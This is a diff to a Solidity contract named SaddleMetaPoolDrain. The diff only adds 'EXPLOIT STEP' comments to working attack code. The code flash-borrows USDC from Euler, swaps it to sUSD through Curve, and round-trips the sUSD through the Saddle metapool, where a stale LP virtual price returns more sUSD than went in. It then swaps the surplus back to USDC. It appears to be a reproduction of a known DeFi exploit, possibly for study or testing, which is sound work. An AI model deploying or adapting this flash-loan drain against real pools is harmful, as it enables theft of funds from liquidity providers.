@@ -47,6 +47,7 @@ contract SaddleMetaPoolDrain {
     // step 0: flash-borrow USDC from Euler (ERC-3156, 0 fee). The callback below
     // does the round-trip and repays.
     function run() external {
+        // EXPLOIT ENTRY: Flashloan-driven virtual price round-trip against Saddle metapool (see attack()).
         IEuler(EULER_LOANS).flashLoan(address(this), USDC, FLASH_AMOUNT, new bytes(0));
     }
 
@@ -62,32 +63,35 @@ contract SaddleMetaPoolDrain {
     }
 
     function attack() internal {
-        // Leg 1: swap flash-loaned USDC -> sUSD via the Curve sUSD base pool.
-        // index 1 = USDC, index 3 = sUSD.
+        // EXPLOIT STEP 0: Flash loan received (callback context).
+
+        // EXPLOIT STEP 1: Leg 1 - swap flash-loaned USDC -> sUSD via the Curve sUSD base pool.
+        // index 1 = USDC, index 3 = sUSD. Moves Curve reserves, altering virtual price of its LP.
         uint256 amount = IERC20(USDC).balanceOf(address(this));
         IERC20(USDC).approve(CURVE_POOL, amount);
         ICurve(CURVE_POOL).exchange(1, 3, amount, 1);
 
-        // Legs 2 & 3: the metapool round-trip — sUSD -> saddleUSDV2 -> sUSD.
+        // EXPLOIT STEP 2+3: Legs 2 & 3 - the metapool round-trip — sUSD -> saddleUSDV2 -> sUSD.
+        // The profit is generated here due to stale virtual price on reverse leg.
         swapToSaddle(IERC20(SUSD).balanceOf(address(this)));
         swapFromSaddle();
 
-        // Leg 4: swap the surplus sUSD back to USDC via Curve.
-        // index 3 = sUSD, index 1 = USDC.
+        // EXPLOIT STEP 4: Leg 4 - swap the surplus sUSD back to USDC via Curve.
+        // index 3 = sUSD, index 1 = USDC. Realize net profit after repaying flashloan.
         amount = IERC20(SUSD).balanceOf(address(this));
         IERC20(SUSD).approve(CURVE_POOL, amount);
         ICurve(CURVE_POOL).exchange(3, 1, amount, 1);
     }
 
-    // Leg 2: sUSD -> saddleUSDV2 LP in the Saddle metapool. index 0 = sUSD, 1 = LP.
+    // EXPLOIT STEP 2: Leg 2: sUSD -> saddleUSDV2 LP in the Saddle metapool. index 0 = sUSD, 1 = LP.
     function swapToSaddle(uint256 amountStart) internal {
         uint256 amount = amountStart;
         IERC20(SUSD).approve(SADDLE_POOL, amount);
         ISaddle(SADDLE_POOL).swap(0, 1, amount, 1, block.timestamp);
     }
 
-    // Leg 3: saddleUSDV2 LP -> sUSD. Priced against a stale LP virtual price ->
-    // returns MORE sUSD than leg 2 took in.
+    // EXPLOIT STEP 3: Leg 3: saddleUSDV2 LP -> sUSD. Priced against a stale LP virtual price ->
+    // returns MORE sUSD than leg 2 took in. This is where the vulnerability is monetized.
     function swapFromSaddle() internal {
         uint256 amount = IERC20(SADDLE_USD_V2).balanceOf(address(this));
         IERC20(SADDLE_USD_V2).approve(SADDLE_POOL, amount);
